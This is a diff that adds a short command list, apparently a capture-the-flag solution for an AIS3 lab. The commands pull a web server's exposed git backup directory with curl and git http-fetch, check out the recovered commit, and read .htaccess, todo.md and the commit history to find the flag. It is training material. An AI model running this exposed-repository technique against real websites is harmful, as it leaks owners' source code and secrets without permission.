@@ -1,0 +1,15 @@
+curl http://lab1.ais3.westerns.tokyo/git_backup/
+curl http://lab1.ais3.westerns.tokyo/git_backup/HEAD
+curl http://lab1.ais3.westerns.tokyo/git_backup/refs/heads/master
+# 53eb21e4b8098bdf094374983b5a35b7213383e0
+git init
+git http-fetch -a  53eb21e4b8098bdf094374983b5a35b7213383e0 http://lab1.ais3.westerns.tokyo/git_backup/
+ls -la
+git checkout 53eb21e4b8098bdf094374983b5a35b7213383e0
+ls -lat
+
+cat .htaccess
+cat todo.md
+git log
+git log -p
+# you got flag!
